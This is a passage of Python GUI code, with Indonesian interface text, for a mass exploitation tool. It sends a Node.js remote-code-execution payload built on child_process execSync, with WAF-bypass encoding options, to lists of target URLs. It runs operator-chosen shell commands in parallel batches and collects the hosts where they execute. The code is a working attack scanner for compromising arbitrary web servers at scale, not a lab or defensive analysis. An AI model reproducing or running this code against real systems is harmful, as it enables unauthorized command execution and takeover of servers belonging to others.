            self.vuln_count_label.config(text="Total: 0")
            self.vuln_counter = 0
            with self.vulnerable_urls_lock:
                self.vulnerable_urls = []
        
        def clear_not_vuln():
            self.scan_not_vuln_output.delete('1.0', tk.END)
            self.not_vuln_count_label.config(text="Total: 0")
            self.not_vuln_counter = 0
        
        clear_vuln_btn = ttk.Button(action_frame, text="🗑️ Clear Vulnerable", command=clear_vuln)
        clear_vuln_btn.pack(side=tk.LEFT, padx=5)
        
        clear_not_vuln_btn = ttk.Button(action_frame, text="🗑️ Clear Not Vulnerable", command=clear_not_vuln)
        clear_not_vuln_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Separator(action_frame, orient=tk.VERTICAL).pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=5)
        
        # Copy vulnerable URLs button (enabled from start, can copy during scan)
        self.copy_vuln_btn = ttk.Button(action_frame, text="📋 Copy Vulnerable URLs", command=self._copy_vulnerable_urls)
        self.copy_vuln_btn.pack(side=tk.LEFT, padx=5)
        
        # Store vulnerable URLs and counters
        # vulnerable_urls structure: [{"url": str, "commands": [{"cmd": str, "output": str}]}]
        self.vulnerable_urls = []
        self.vuln_counter = 0
        self.not_vuln_counter = 0
        self.vulnerable_urls_lock = threading.Lock()  # Thread-safe access to vulnerable_urls
        self.scan_running = False  # Flag to prevent duplicate scans
        self.scan_stop_flag = False  # Flag to stop scan gracefully
        self.scan_thread = None  # Store reference to scan thread for force stop
        self.scan_executor = None  # Store reference to ThreadPoolExecutor for force stop
        self.scan_futures = []  # Store all futures for cancellation
        self.scan_thread = None  # Store reference to scan thread for force stop
        self.scan_executor = None  # Store reference to ThreadPoolExecutor for force stop
    
    def _start_mass_scan(self):
        """Start mass scanning process."""
        # Prevent duplicate scans
        if self.scan_running:
            messagebox.showwarning("Warning", "Scan sedang berjalan, tunggu hingga selesai", parent=self.root)
            return
        
        if not self._preflight_check():
            return
        
        targets_text = self.scan_targets_text.get('1.0', tk.END).strip()
        if not targets_text:
            messagebox.showwarning("Warning", "Masukkan list target terlebih dahulu", parent=self.root)
            return
        
        # Parse targets (with deduplication)
        targets = parse_target_list(targets_text)
        if not targets:
            messagebox.showwarning("Warning", "Tidak ada target yang valid ditemukan", parent=self.root)
            return
        
        # Show deduplication info if duplicates were removed
        total_lines = len([l for l in targets_text.strip().split('\n') if l.strip() and not l.strip().startswith('#')])
        unique_targets = len(targets)
        if total_lines > unique_targets:
            removed_count = total_lines - unique_targets
            self.scan_progress_var.set(f"Menghapus {removed_count} duplikat, {unique_targets} target unik...")
        
        # Set scan running flag
        self.scan_running = True
        self.scan_stop_flag = False
        
        # Update button states
        self.scan_start_btn.config(state=tk.DISABLED)
        self.scan_stop_btn.config(state=tk.NORMAL)
        
        # Clear outputs and reset counters
        self.scan_vuln_output.delete('1.0', tk.END)
        self.scan_not_vuln_output.delete('1.0', tk.END)
        self.vuln_count_label.config(text="Total: 0")
        self.not_vuln_count_label.config(text="Total: 0")
        self.vuln_counter = 0
        self.not_vuln_counter = 0
        with self.vulnerable_urls_lock:
            self.vulnerable_urls = []
        self.scan_progress_var.set(f"Memulai scan untuk {len(targets)} target...")
        self.scan_current_url_var.set("Preparing...")
        
        # Get commands to test
        use_multiple_cmds = self.scan_multiple_cmds_var.get()
        if use_multiple_cmds:
            cmds_text = self.scan_multiple_cmds_text.get('1.0', tk.END).strip()
            test_commands = [cmd.strip() for cmd in cmds_text.split('\n') if cmd.strip()]
            if not test_commands:
                self.scan_running = False
                messagebox.showwarning("Warning", "Masukkan command untuk multiple commands mode", parent=self.root)
                return
        else:
            test_commands = [self.scan_test_cmd_var.get()]
        
        use_multithread = self.scan_multithread_var.get()
        
        # Get thread count and batch size
        try:
            num_threads = int(self.scan_threads_var.get())
            if num_threads < 1:
                num_threads = 1
            elif num_threads > 5:
                num_threads = 5
        except ValueError:
            num_threads = 3
            use_multithread = False
        
        if not use_multithread:
            num_threads = 1
        
        # Get batch size
        try:
            batch_size = int(self.scan_batch_size_var.get())
            if batch_size < 1:
                batch_size = 10
            elif batch_size > 100:
                batch_size = 100
        except ValueError:
            batch_size = 10
        
        if not use_multithread:
            batch_size = 1  # Single-threaded doesn't need batching
        
        # Get scan timeout (default 10 seconds)
        try:
            scan_timeout = int(self.scan_timeout_var.get())
            if scan_timeout < 1:
                scan_timeout = 10
            elif scan_timeout > 300:
                scan_timeout = 300  # Max 5 minutes
        except ValueError:
            scan_timeout = 10
        
        # Thread-safe counter and list
        vulnerable_count = [0]
        not_vulnerable_count = [0]
        error_count = [0]
        results_lock = threading.Lock()
        
        def scan_single_target(base_url: str, original: str, idx: int, total: int):
            """Scan a single target with multiple commands."""
            # Check stop flag before starting
            if self.scan_stop_flag:
                return
            
            # Mark as processed at the end (in finally block)
            target_processed = False
            
            # Update current scanning URL
            self.root.after(0, lambda url=base_url, idx=idx, total=total: 
                          self.scan_current_url_var.set(f"[{idx}/{total}] {url}"))
            
            def _execute_scan():
                """Inner function to execute scan with timeout protection."""
                # Create temporary exploit instance with scan timeout
                # Use slightly less than scan_timeout for requests to ensure we catch timeout
                request_timeout = max(2, scan_timeout - 1)  # 1 second buffer, min 2 seconds
                scan_exploit = CVEExploit(timeout=request_timeout, verify_ssl=False)
                scan_exploit.update_proxy(
                    self.proxy_check_var.get(),
                    self.proxy_entry.get()
                )
                
                # Disable retries completely for faster timeout (modify session adapter)
                # This ensures we don't retry on timeout - force no retry at all
                for prefix in ('http://', 'https://'):
                    if prefix in scan_exploit.session.adapters:
                        adapter = scan_exploit.session.adapters[prefix]
                        # Force disable ALL retries - no retry whatsoever
                        from urllib3.util.retry import Retry
                        adapter.max_retries = Retry(
                            total=0, 
                            connect=0, 
                            read=0, 
                            redirect=0,
                            status=0,
                            other=0,
                            backoff_factor=0
                        )
                
                command_results = []
                all_success = False
                
                # Test all commands
                for cmd in test_commands:
                    # Check stop flag before each command
                    if self.scan_stop_flag:
                        break
                    
                    try:
                        result = scan_exploit.execute_command_auto(
                    base_url,
                    self.endpoint_entry.get(),
                            cmd,
                    self.unicode_waf_var.get(),
                    self.utf16_waf_var.get(),
                    self.aes_var.get(),
                    False,  # Always sync for scan
                    self.payload_type_var.get()
                )
                
                        # Validate output length - if > 50 characters, mark as invalid
                        if result and len(result.strip()) > 50:
                            # Output too long, likely invalid/false positive
                            # Don't add to command_results, treat as failed
                            continue
                        
                        # Success - store command result
                        command_results.append({"cmd": cmd, "output": result})
                        all_success = True
                    except Exception as e:
                        # Command failed, but continue with other commands
                        error_msg = str(e)
                        # If it's a timeout error, skip this target (timeout exceeded)
                        if "timeout" in error_msg.lower():
                            # Timeout exceeded - skip this target entirely
                            raise Exception(f"Timeout ({scan_timeout}s) exceeded - skipping target")
                        # If it's a critical error (not just command failure), mark as failed
                        if "connection" in error_msg.lower():
                            # Connection error - skip remaining commands
                            break
                        # Otherwise, continue with next command
                
                return command_results, all_success
            
            # Execute scan with global timeout using ThreadPoolExecutor
            # Use aggressive timeout with proper cancellation
            command_results = []
            all_success = False
            error_msg = None
            status_code = None
            
            try:
                from concurrent.futures import ThreadPoolExecutor, TimeoutError as FuturesTimeoutError
                
                executor = ThreadPoolExecutor(max_workers=1)
                try:
                    future = executor.submit(_execute_scan)
                    try:
                        command_results, all_success = future.result(timeout=scan_timeout)
                    except FuturesTimeoutError:
                        # Global timeout exceeded - force cancel and skip this target
                        future.cancel()
                        error_msg = f"Timeout ({scan_timeout}s) exceeded - skipping target"
                        all_success = False
                        command_results = []
                    except Exception as e:
                        # Check if it's a timeout-related error
                        error_msg = str(e)
                        if "timeout" in error_msg.lower() or "Timeout" in str(type(e).__name__):
                            future.cancel()
                            error_msg = f"Timeout ({scan_timeout}s) exceeded - skipping target"
                            all_success = False
                            command_results = []
                        else:
                            # Other exception - store error message
                            error_msg = str(e)
                            all_success = False
                            command_results = []
                finally:
                    # Force shutdown executor immediately (don't wait for completion)
                    executor.shutdown(wait=False, cancel_futures=True)
            except Exception as e:
                # Re-raise to be handled by outer exception handler
                error_msg = str(e)
                if "timeout" in error_msg.lower() or "Timeout" in str(type(e).__name__):
                    error_msg = f"Timeout ({scan_timeout}s) exceeded - skipping target"
                all_success = False
                command_results = []
            
            # If we have an error message from exception, skip to error handling
            if error_msg:
                # Error occurred during scan execution - handle it
                error_first_line = error_msg.split('\n')[0].strip()
                if len(error_first_line) > 150:
                    error_first_line = error_first_line[:147] + "..."
                
                # Try to get status code if possible
                try:
                    test_cmd = test_commands[0] if test_commands else "id"
                    request_timeout = max(1, scan_timeout - 1)
                    scan_exploit = CVEExploit(timeout=request_timeout, verify_ssl=False)
                    scan_exploit.update_proxy(
                        self.proxy_check_var.get(),
                        self.proxy_entry.get()
                    )
                    res = scan_exploit.send_complex_payload(
                        base_url,
                        self.endpoint_entry.get(),
                        f"process.mainModule.require('child_process').execSync('{test_cmd}').toString()",
                        self.unicode_waf_var.get(),
                        self.utf16_waf_var.get(),
                        self.aes_var.get(),
                        self.payload_type_var.get()
                    )
                    status_code = res.status_code
                except:
                    pass
                
                # Check if it's a timeout or connection error (not vulnerable)
                if "timeout" in error_msg.lower() or "connection" in error_msg.lower() or "500" in error_msg or "gagal" in error_msg.lower() or "tidak ada output" in error_msg.lower() or "permintaan gagal" in error_msg.lower() or "no result captured" in error_msg.lower():
                    with results_lock:
                        not_vulnerable_count[0] += 1
                    
                    self.root.after(0, lambda idx=idx, total=total, base_url=base_url, 
                                  error_first_line=error_first_line, status_code=status_code: 
                                  self._update_scan_output_not_vulnerable(
                        idx, total, base_url, error_first_line, status_code
                    ))
                else:
                    with results_lock:
                        error_count[0] += 1
                    
                    self.root.after(0, lambda idx=idx, total=total, base_url=base_url, 
                                  error_first_line=error_first_line: 
                                  self._update_scan_output_error(
                        idx, total, base_url, error_first_line
                    ))
                target_processed = True
                return
            
            # Validate command results - filter out invalid outputs (> 50 chars)
            valid_command_results = []
            for cmd_result in command_results:
                output = cmd_result.get('output', '')
                if output and len(output.strip()) <= 50:
                    # Valid output (<= 50 chars)
                    valid_command_results.append(cmd_result)
                # If output > 50 chars, skip it (don't add to valid results)
            
            # If at least one command succeeded with valid output, target is vulnerable
            if all_success and valid_command_results:
                with results_lock:
                    vulnerable_count[0] += 1
                    # Store URL with valid command results only
                    with self.vulnerable_urls_lock:
                        self.vulnerable_urls.append({
                            "url": base_url,
                            "commands": valid_command_results
                        })
                
                # Update output thread-safely - fix lambda closure
                self.root.after(0, lambda idx=idx, total=total, base_url=base_url, 
                              command_results=valid_command_results: 
                              self._update_scan_output_vulnerable(
                                  idx, total, base_url, command_results
                              ))
                target_processed = True
                return
            
            # If all outputs are invalid (> 50 chars), treat as not vulnerable
            if command_results and not valid_command_results:
                # All outputs were invalid, mark as not vulnerable
                error_msg = "Output tidak valid (panjang > 50 karakter)"
                self.root.after(0, lambda idx=idx, total=total, base_url=base_url, msg=error_msg: 
                              self._update_scan_output_not_vulnerable(idx, total, base_url, msg))
                target_processed = True
                return
                
            # If we reach here, all commands failed or no commands succeeded
            if not all_success:
                error_msg = "All commands failed"
                if command_results:
                    # Some commands failed but we have partial results - shouldn't happen, but handle it
                    error_msg = "Partial failure"
                
                status_code = None
                try:
                    # Try to get status code from last failed command
                    test_cmd = test_commands[0] if test_commands else "id"
                    request_timeout = max(1, scan_timeout - 1)  # 1 second buffer
                    scan_exploit = CVEExploit(timeout=request_timeout, verify_ssl=False)
                    scan_exploit.update_proxy(
                        self.proxy_check_var.get(),
                        self.proxy_entry.get()
                    )
                    res = scan_exploit.send_complex_payload(
                        base_url,
                        self.endpoint_entry.get(),
                        f"process.mainModule.require('child_process').execSync('{test_cmd}').toString()",
                        self.unicode_waf_var.get(),
                        self.utf16_waf_var.get(),
                        self.aes_var.get(),
                        self.payload_type_var.get()
                    )
                    status_code = res.status_code
                except Exception as e:
                    error_msg = str(e)
                    # Try to extract status code from error message
                    import re as regex_module
                    status_match = regex_module.search(r'(\d{3})', error_msg)
                    if status_match:
                        status_code = int(status_match.group(1))
                
                error_first_line = error_msg.split('\n')[0].strip()
                if len(error_first_line) > 150:
                    error_first_line = error_first_line[:147] + "..."
                
                # Check if it's a timeout or connection error (not vulnerable)
                if "timeout" in error_msg.lower() or "connection" in error_msg.lower() or "500" in error_msg or "gagal" in error_msg.lower() or "tidak ada output" in error_msg.lower() or "permintaan gagal" in error_msg.lower() or "no result captured" in error_msg.lower():
                    with results_lock:
                        not_vulnerable_count[0] += 1
                    
                    # Fix lambda closure by using default arguments
                    self.root.after(0, lambda idx=idx, total=total, base_url=base_url, 
                                  error_first_line=error_first_line, status_code=status_code: 
                                  self._update_scan_output_not_vulnerable(
                        idx, total, base_url, error_first_line, status_code
                    ))
                else:
                    with results_lock:
                        error_count[0] += 1
                    
                    # Fix lambda closure by using default arguments
                    self.root.after(0, lambda idx=idx, total=total, base_url=base_url, 
                                  error_first_line=error_first_line: 
                                  self._update_scan_output_error(
                        idx, total, base_url, error_first_line
                    ))
        
        def scan_targets():
            """Scan targets in batches."""
            try:
                total = len(targets)
                processed_count = [0]  # Track processed targets
                
                if use_multithread and num_threads > 1 and batch_size > 1:
                    # Batch-based multi-threaded scanning
                    from concurrent.futures import ThreadPoolExecutor, as_completed
                    
                    # Split targets into batches
                    batches = []
                    for i in range(0, len(targets), batch_size):
                        batch = targets[i:i + batch_size]
                        batches.append(batch)
                    
                    total_batches = len(batches)
                    self.root.after(0, lambda: self.scan_progress_var.set(
                        f"Memulai scan: {total} target dalam {total_batches} batch..."
                    ))
                    
                    # Process each batch
                    for batch_num, batch in enumerate(batches, 1):
                        if self.scan_stop_flag:
                            break
                        
                        batch_start_idx = (batch_num - 1) * batch_size + 1
                        self.root.after(0, lambda batch_num=batch_num, total_batches=total_batches, 
                                      batch_size=len(batch): 
                                      self.scan_progress_var.set(
                                          f"Batch {batch_num}/{total_batches} ({batch_size} target)..."
                                      ))
                        # Clear current URL when starting new batch
                        self.root.after(0, lambda: self.scan_current_url_var.set("Processing batch..."))
                        
                        executor = ThreadPoolExecutor(max_workers=num_threads)
                        self.scan_executor = executor  # Store reference for force stop
                        try:
                            futures = []
                            for idx_in_batch, (base_url, original) in enumerate(batch):
                                if self.scan_stop_flag:
                                    break
                                idx = batch_start_idx + idx_in_batch
                                future = executor.submit(scan_single_target, base_url, original, idx, total)
                                futures.append(future)
                                self.scan_futures.append(future)  # Store for cancellation
                                processed_count[0] += 1  # Count as processed when submitted
                            
                            # Wait for all targets in this batch to complete
                            # Use as_completed with proper error handling to ensure all targets are processed
                            completed_count = 0
                            for future in as_completed(futures):
                                if self.scan_stop_flag:
                                    # Cancel remaining futures
                                    for f in futures:
                                        f.cancel()
                                    break
                                try:
                                    # Get result without timeout - as_completed already waits for completion
                                    # scan_single_target handles all errors internally and updates UI
                                    future.result()  # No timeout - let it complete naturally
                                    completed_count += 1
                                except Exception as e:
                                    # If scan_single_target raised an exception, it should have been handled internally
                                    # But if it didn't, log it (though this shouldn't happen)
                                    # scan_single_target should have handled all exceptions internally
                                    # If we get here, it means an unexpected exception occurred
                                    completed_count += 1  # Still count as completed (error was handled in scan_single_target)
                                    pass  # scan_single_target should have handled this
                            
                            # Ensure all futures are completed before moving to next batch
                            # Wait for any remaining futures that might not have been in as_completed
                            remaining_futures = [f for f in futures if not f.done()]
                            if remaining_futures:
                                # Wait for remaining futures with a reasonable timeout
                                import time
                                start_time = time.time()
                                max_wait = scan_timeout * 2  # Allow up to 2x scan timeout for remaining futures
                                while remaining_futures and (time.time() - start_time) < max_wait:
                                    if self.scan_stop_flag:
                                        break
                                    for f in list(remaining_futures):
                                        if f.done():
                                            try:
                                                f.result()  # Get result to clear exception if any
                                            except:
                                                pass  # Exception already handled in scan_single_target
                                            remaining_futures.remove(f)
                                    if remaining_futures:
                                        time.sleep(0.1)  # Small delay before checking again
                                
                                # If still have remaining futures, cancel them (but count as processed)
                                for f in remaining_futures:
                                    f.cancel()
                                    processed_count[0] += 1  # Count cancelled as processed (user stopped)
                        finally:
                            # Verify all futures are done before shutdown
                            import time
                            remaining_futures_check = [f for f in futures if not f.done()]
                            if remaining_futures_check:
                                # Wait a bit more for any remaining futures
                                start_wait = time.time()
                                max_wait = scan_timeout * 2  # Allow up to 2x scan timeout
                                while remaining_futures_check and (time.time() - start_wait) < max_wait:
                                    if self.scan_stop_flag:
                                        break
                                    for f in list(remaining_futures_check):
                                        if f.done():
                                            try:
                                                f.result()  # Get result to clear exception if any
                                            except:
                                                pass  # Exception already handled in scan_single_target
                                            remaining_futures_check.remove(f)
                                    if remaining_futures_check:
                                        time.sleep(0.1)  # Small delay before checking again
                            
                            # Shutdown executor - all futures should be done by now
                            executor.shutdown(wait=False, cancel_futures=True)
                            self.scan_executor = None
                            self.scan_futures = []
                        
                        # Small delay between batches to avoid overwhelming
                        import time
                        time.sleep(0.1)
                else:
                    # Single-threaded scanning (no batching needed)
                    for idx, (base_url, original) in enumerate(targets, 1):
                        if self.scan_stop_flag:
                            break
                        
                        processed_count[0] += 1  # Count each target as processed
                        
                        # Update progress and current URL
                        self.root.after(0, lambda idx=idx, total=total, base_url=base_url: 
                                      self.scan_progress_var.set(f"Scanning {idx}/{total}: {base_url}"))
                        self.root.after(0, lambda idx=idx, total=total, base_url=base_url:
                                      self.scan_current_url_var.set(f"[{idx}/{total}] {base_url}"))
                        self.root.update_idletasks()
                        
                        try:
                            def _execute_scan_single():
                                """Inner function to execute scan with timeout protection."""
                                # Create temporary exploit instance with scan timeout
                                # Use slightly less than scan_timeout for requests to ensure we catch timeout
                                request_timeout = max(2, scan_timeout - 1)  # 1 second buffer, min 2 seconds
                                scan_exploit = CVEExploit(timeout=request_timeout, verify_ssl=False)
                                scan_exploit.update_proxy(
                                    self.proxy_check_var.get(),
                                    self.proxy_entry.get()
                                )
                                
                                # Disable retries completely for faster timeout
                                for prefix in ('http://', 'https://'):
                                    if prefix in scan_exploit.session.adapters:
                                        adapter = scan_exploit.session.adapters[prefix]
                                        # Force disable ALL retries - no retry whatsoever
                                        from urllib3.util.retry import Retry
                                        adapter.max_retries = Retry(
                                            total=0, 
                                            connect=0, 
                                            read=0, 
                                            redirect=0,
                                            status=0,
                                            other=0,
                                            backoff_factor=0
                                        )
                                
                                # Test all commands
                                command_results = []
                                all_success = False
                                
                                for cmd in test_commands:
                                    # Check stop flag before each command
                                    if self.scan_stop_flag:
                                        break
                                    
                                    try:
                                        result = scan_exploit.execute_command_auto(
                                            base_url,
                                            self.endpoint_entry.get(),
                                            cmd,
                                            self.unicode_waf_var.get(),
                                            self.utf16_waf_var.get(),
                                            self.aes_var.get(),
                                            False,  # Always sync for scan
                                            self.payload_type_var.get()
                                        )
                                        command_results.append({"cmd": cmd, "output": result})
                                        all_success = True
                                    except Exception as e:
                                        # Command failed, continue with next
                                        error_msg = str(e)
                                        # If timeout, skip this target
                                        if "timeout" in error_msg.lower():
                                            raise Exception(f"Timeout ({scan_timeout}s) exceeded - skipping target")
                                        if "connection" in error_msg.lower():
                                            break
                                
                                return command_results, all_success
                            
                            # Execute scan with global timeout using ThreadPoolExecutor
                            from concurrent.futures import ThreadPoolExecutor, TimeoutError as FuturesTimeoutError
                            
                            executor = ThreadPoolExecutor(max_workers=1)
                            try:
                                future = executor.submit(_execute_scan_single)
                                try:
                                    command_results, all_success = future.result(timeout=scan_timeout)
                                except FuturesTimeoutError:
                                    # Global timeout exceeded - force cancel and skip this target
                                    future.cancel()
                                    raise Exception(f"Timeout ({scan_timeout}s) exceeded - skipping target")
                                except Exception as e:
                                    # Check if it's a timeout-related error
                                    error_msg = str(e)
                                    if "timeout" in error_msg.lower() or "Timeout" in str(type(e).__name__):
                                        future.cancel()
                                        raise Exception(f"Timeout ({scan_timeout}s) exceeded - skipping target")
                                    raise
                            finally:
                                # Force shutdown executor immediately
                                executor.shutdown(wait=False, cancel_futures=True)
                            
                            if all_success and command_results:
                                # Success - vulnerable
                                vulnerable_count[0] += 1
                                with self.vulnerable_urls_lock:
                                    self.vulnerable_urls.append({
                                        "url": base_url,
                                        "commands": command_results
                                    })
                                self.vuln_counter += 1
                                self.root.after(0, lambda: self.vuln_count_label.config(text=f"Total: {self.vuln_counter}"))
                                
                                self.root.after(0, lambda base_url=base_url, cmd_results=command_results, counter=self.vuln_counter: 
                                              self._add_vulnerable_output(base_url, cmd_results, counter))
                            else:
                                # All commands failed
                                raise Exception("All commands failed")
                        
                        except Exception as e:
                            error_msg = str(e)
                        
                        # Ensure error_msg is initialized
                        if 'error_msg' not in locals() or error_msg is None:
                            error_msg = "Unknown error"
                        
                        error_first_line = error_msg.split('\n')[0].strip()
                        if len(error_first_line) > 150:
                            error_first_line = error_first_line[:147] + "..."
                        
                        # Get status code from send_complex_payload
                        status_code = None
                        try:
                            test_cmd = test_commands[0] if test_commands else "id"
                            request_timeout = max(1, scan_timeout - 1)  # 1 second buffer
                            scan_exploit = CVEExploit(timeout=request_timeout, verify_ssl=False)
                            scan_exploit.update_proxy(
                                self.proxy_check_var.get(),
                                self.proxy_entry.get()
                            )
                            res = scan_exploit.send_complex_payload(
                                base_url,
                                self.endpoint_entry.get(),
                                f"process.mainModule.require('child_process').execSync('{test_cmd}').toString()",
                                self.unicode_waf_var.get(),
                                self.utf16_waf_var.get(),
                                self.aes_var.get(),
                                self.payload_type_var.get()
                            )
                            status_code = res.status_code
                        except:
                            pass
                        
                        if "timeout" in error_msg.lower() or "connection" in error_msg.lower() or "500" in error_msg or "gagal" in error_msg.lower() or "tidak ada output" in error_msg.lower() or "permintaan gagal" in error_msg.lower() or "no result captured" in error_msg.lower():
                            not_vulnerable_count[0] += 1
                            self.not_vuln_counter += 1
                            self.not_vuln_count_label.config(text=f"Total: {self.not_vuln_counter}")
                            
                            self.scan_not_vuln_output.insert(tk.END, f"[{self.not_vuln_counter}] ", "not_vulnerable")
                            self.scan_not_vuln_output.insert(tk.END, f"{base_url}\n", "not_vulnerable")
                            status_text = f" (Status Code: {status_code})" if status_code else ""
                            self.scan_not_vuln_output.insert(tk.END, f"  Response: ", "not_vulnerable")
                            self.scan_not_vuln_output.insert(tk.END, f"{error_first_line}{status_text}\n", "response")
                            self.scan_not_vuln_output.insert(tk.END, "\n" + "─" * 60 + "\n\n")
                        else:
                            error_count[0] += 1
                            self.not_vuln_counter += 1
                            self.not_vuln_count_label.config(text=f"Total: {self.not_vuln_counter}")
                            
                            self.scan_not_vuln_output.insert(tk.END, f"[{self.not_vuln_counter}] ", "error")
                            self.scan_not_vuln_output.insert(tk.END, f"{base_url}\n", "error")
                            self.scan_not_vuln_output.insert(tk.END, f"  ⚠️  ERROR: {error_first_line}\n", "error")
                            self.scan_not_vuln_output.insert(tk.END, "\n" + "─" * 60 + "\n\n")
                    
                    self.scan_vuln_output.see(tk.END)
                    self.scan_not_vuln_output.see(tk.END)
                    self.root.update_idletasks()
            
                # Final summary
                final_vuln = vulnerable_count[0]
                final_not_vuln = not_vulnerable_count[0]
                final_error = error_count[0]
                final_processed = processed_count[0]
                
                # Verify all targets were processed
                if final_processed < total and not self.scan_stop_flag:
                    # Some targets were not processed - log warning
                    missing = total - final_processed
                    print(f"WARNING: {missing} target(s) were not processed (processed: {final_processed}/{total})")
                    # Update error count to include missing targets
                    final_error += missing
                
                self.root.after(0, lambda: self._finalize_scan_results(
                    total, final_vuln, final_not_vuln, final_error, final_processed
                ))
                
            except Exception as e:
                # Error in scan process - reset flag and show error
                self.scan_running = False
                self.root.after(0, lambda: messagebox.showerror(
                    "Error", f"Error saat scanning: {str(e)}", parent=self.root
                ))
                self.root.after(0, lambda: self.scan_progress_var.set("Error: Scan gagal"))
                self.root.after(0, lambda: self.scan_current_url_var.set(""))
            finally:
                # Always reset scan_running flag and button states
                self.scan_running = False
                self.scan_stop_flag = False
                self.scan_executor = None
                self.scan_futures = []
                self.root.after(0, lambda: self.scan_start_btn.config(state=tk.NORMAL))
                self.root.after(0, lambda: self.scan_stop_btn.config(state=tk.DISABLED))
        
        # Start scan in background thread
        self.scan_thread = threading.Thread(target=scan_targets, daemon=True)
        self.scan_thread.start()
    
    def _stop_mass_scan(self):
        """Stop mass scanning process immediately."""
        if not self.scan_running:
            return
        
        # Set stop flag
        self.scan_stop_flag = True
        
        # Cancel all futures
        if self.scan_futures:
            for future in self.scan_futures:
                try:
                    future.cancel()
                except:
                    pass
            self.scan_futures = []
        
        # Shutdown executor if exists
        if self.scan_executor:
            try:
                self.scan_executor.shutdown(wait=False, cancel_futures=True)
            except:
                pass
            self.scan_executor = None
        
        # Update UI
        self.scan_progress_var.set("⏹️ Scan dihentikan oleh user...")
        self.scan_current_url_var.set("")
        self.scan_running = False
        
        # Update button states
        self.scan_start_btn.config(state=tk.NORMAL)
        self.scan_stop_btn.config(state=tk.DISABLED)
        
        # Show message
        messagebox.showinfo("Scan Dihentikan", "Scan telah dihentikan. Proses yang sedang berjalan akan dibatalkan.", parent=self.root)
    
    def _update_scan_output_vulnerable(self, idx: int, total: int, base_url: str, command_results: list):
        """Update output for vulnerable target (called from main thread)."""
        self.scan_progress_var.set(f"Scanning {idx}/{total}: {base_url}")
        self.scan_current_url_var.set(f"[{idx}/{total}] {base_url} ✅")
        self.vuln_counter += 1
        self.vuln_count_label.config(text=f"Total: {self.vuln_counter}")
        
        # Add to vulnerable output
        self.scan_vuln_output.insert(tk.END, f"[{self.vuln_counter}] ", "header")
        self.scan_vuln_output.insert(tk.END, f"{base_url}\n", "vulnerable")
        for cmd_result in command_results:
            self.scan_vuln_output.insert(tk.END, f"  Command: {cmd_result['cmd']}\n")
        self.scan_vuln_output.insert(tk.END, f"  Output:\n")
        
        # Validate output length - if > 50 characters, show "tidak valid"
        output = cmd_result['output']
        if output and len(output.strip()) > 50:
            self.scan_vuln_output.insert(tk.END, f"    tidak valid\n", "error")
        else:
            output_lines = output.split('\n')
            for line in output_lines:
                if line.strip():  # Only add non-empty lines
                    self.scan_vuln_output.insert(tk.END, f"    {line}\n")
        self.scan_vuln_output.insert(tk.END, "\n" + "─" * 60 + "\n\n")
        self.scan_vuln_output.see(tk.END)
    
    def _update_scan_output_not_vulnerable(self, idx: int, total: int, base_url: str, error_msg: str, status_code: int = None):
        """Update output for not vulnerable target (called from main thread)."""
        self.scan_progress_var.set(f"Scanning {idx}/{total}: {base_url}")
        self.scan_current_url_var.set(f"[{idx}/{total}] {base_url} ❌")
        self.not_vuln_counter += 1
        self.not_vuln_count_label.config(text=f"Total: {self.not_vuln_counter}")
        
        # Add to not vulnerable output
        self.scan_not_vuln_output.insert(tk.END, f"[{self.not_vuln_counter}] ", "not_vulnerable")
        self.scan_not_vuln_output.insert(tk.END, f"{base_url}\n", "not_vulnerable")
        status_text = f" (Status Code: {status_code})" if status_code else ""
        self.scan_not_vuln_output.insert(tk.END, f"  Response: ", "not_vulnerable")
        self.scan_not_vuln_output.insert(tk.END, f"{error_msg}{status_text}\n", "response")
        self.scan_not_vuln_output.insert(tk.END, "\n" + "─" * 60 + "\n\n")
        self.scan_not_vuln_output.see(tk.END)
    
    def _update_scan_output_error(self, idx: int, total: int, base_url: str, error_msg: str):
        """Update output for error (called from main thread)."""
        self.scan_progress_var.set(f"Scanning {idx}/{total}: {base_url}")
        self.scan_current_url_var.set(f"[{idx}/{total}] {base_url} ⚠️")
        self.not_vuln_counter += 1
        self.not_vuln_count_label.config(text=f"Total: {self.not_vuln_counter}")
        
        # Add to not vulnerable output (errors go here too)
        self.scan_not_vuln_output.insert(tk.END, f"[{self.not_vuln_counter}] ", "error")
        self.scan_not_vuln_output.insert(tk.END, f"{base_url}\n", "error")
        self.scan_not_vuln_output.insert(tk.END, f"  ⚠️  ERROR: {error_msg}\n", "error")
        self.scan_not_vuln_output.insert(tk.END, "\n" + "─" * 60 + "\n\n")
        self.scan_not_vuln_output.see(tk.END)
    
    def _finalize_scan_results(self, total: int, vulnerable_count: int, not_vulnerable_count: int, error_count: int, processed_count: int = None):
        """Finalize scan results (called from main thread)."""
        # Use processed_count if provided, otherwise use total
        if processed_count is None:
            processed_count = total
        
        # Verify all targets were processed
        if processed_count < total:
            # Some targets were not processed - add warning
            missing = total - processed_count
            self.scan_not_vuln_output.insert(tk.END, "=" * 60 + "\n")
            self.scan_not_vuln_output.insert(tk.END, f"⚠️  WARNING: {missing} target(s) were not processed!\n", "error")
            self.scan_not_vuln_output.insert(tk.END, f"Total targets: {total}, Processed: {processed_count}\n", "error")
            self.scan_not_vuln_output.see(tk.END)
        
        # Add summary to vulnerable output
        if vulnerable_count > 0:
            self.scan_vuln_output.insert(tk.END, "=" * 60 + "\n")
            self.scan_vuln_output.insert(tk.END, f"SUMMARY: {vulnerable_count} vulnerable target(s) found\n", "vulnerable")
            self.scan_vuln_output.see(tk.END)
        
        # Add summary to not vulnerable output
        if not_vulnerable_count > 0 or error_count > 0:
            self.scan_not_vuln_output.insert(tk.END, "=" * 60 + "\n")
            summary_text = f"SUMMARY: {not_vulnerable_count} not vulnerable"
            if error_count > 0:
                summary_text += f", {error_count} error(s)"
            if processed_count < total:
                summary_text += f" (Processed: {processed_count}/{total})"
            self.scan_not_vuln_output.insert(tk.END, f"{summary_text}\n", "not_vulnerable")
            self.scan_not_vuln_output.see(tk.END)
        
        self.scan_progress_var.set("Selesai")
        self.scan_current_url_var.set("")
        
        # Update button states
        self.scan_start_btn.config(state=tk.NORMAL)
        self.scan_stop_btn.config(state=tk.DISABLED)
        
        # Show completion message only if not stopped
        if not self.scan_stop_flag:
            message_text = f"Scan selesai!\n\nTotal: {total}\nProcessed: {processed_count}\nVulnerable: {vulnerable_count}\nNot Vulnerable: {not_vulnerable_count}\nError: {error_count}"
            if processed_count < total:
                message_text += f"\n\n⚠️  WARNING: {total - processed_count} target(s) tidak terproses!"
